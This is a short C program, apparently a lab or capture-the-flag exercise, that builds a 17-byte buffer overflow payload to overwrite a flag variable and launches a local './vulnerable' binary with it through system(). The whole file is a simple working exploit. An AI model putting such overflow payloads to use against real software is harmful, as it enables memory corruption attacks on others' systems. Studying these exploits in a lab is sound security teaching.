#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    // Payload: 16 'A's to fill the buffer + 1 byte to overwrite the flag
    char payload[18];
    memset(payload, 'A', 16); // Fill buffer with 'A'
    payload[16] = '\x01';    // Overwrite flag with 1 (set non-zero value)
    payload[17] = '\0';      // Null-terminate the payload

    printf("Launching exploit with payload: %s\n", payload);

    char command[128];
    snprintf(command, sizeof(command), "./vulnerable \"%s\"", payload);

    system(command);

    return 0;
}